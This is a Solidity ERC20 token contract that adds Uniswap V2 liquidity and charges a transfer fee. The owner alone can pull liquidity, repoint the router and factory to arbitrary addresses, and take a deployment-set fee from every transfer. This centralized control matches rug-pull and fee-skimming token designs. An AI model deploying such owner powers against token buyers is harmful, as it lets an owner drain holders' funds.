// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';

contract TokenWithLiquidity is ERC20, Ownable {

    address public UniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public UniswapV2Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public pair;
    bool public active;

    IUniswapV2Router02 public router = IUniswapV2Router02(UniswapV2Router);

    uint public immutable finalTotalSupply;
    uint public immutable fee;

    constructor(
        string memory name_, 
        string memory symbol_, 
        uint ownerAmount,
        uint contractAmount, 
        uint _finalSupply,
        uint _fee
    ) ERC20(name_, symbol_) {
        finalTotalSupply = _finalSupply; 
        fee = _fee;
        _mint(msg.sender, ownerAmount * 10 ** decimals());
        _mint(address(this), contractAmount * 10 ** decimals());
    }

    function addLiquidity(uint256 tokenAmount) external payable onlyOwner {
		this.approve(UniswapV2Router, tokenAmount);
        router.addLiquidityETH{value: msg.value}(
            address(this),
            tokenAmount,
            0,
            0, 
            address(this),
            block.timestamp + 60
        );

        pair = IUniswapV2Factory(UniswapV2Factory).getPair(address(this), WETH);
        active = true;
    }

    function removeLiquidity() external onlyOwner {
        uint liquidity = IERC20(pair).balanceOf(address(this));
        IERC20(pair).approve(UniswapV2Router, liquidity);

        router.removeLiquidity(
            address(this),
            WETH,
            liquidity,
            0,
            0,
            address(this),
            block.timestamp + 60
        );
    }

    function setRouterAddress(address routerAddress) external onlyOwner {
        UniswapV2Router = routerAddress;
    }

    function setFactoryAddress(address factoryAddress) external onlyOwner {
        UniswapV2Factory = factoryAddress;
    }

    function _beforeTokenTransfer(address from, address to, uint value) internal view override {
        require(!active || !isContract(to) , "Buying from a contract is prohibited!");
        if (from == address(0) && to != address(0)) {
            require((totalSupply() + value) <= finalTotalSupply, "Final supply reached"); 
        } 
    }

    function _afterTokenTransfer(address from, address to, uint value) internal override {
        if (from != address(0) && to != address(0)) {
            uint256 ownerFee = value * fee / 100;
            _mint(owner(), ownerFee);
            _burn(from, ownerFee);
        }
    }

    function isContract(address caller) private view returns (bool) {
        if(caller == pair) return false;

        // uint size;
        // assembly { size := extcodesize(caller) }
        // return size > 0;
        return caller.code.length > 0;
    }

}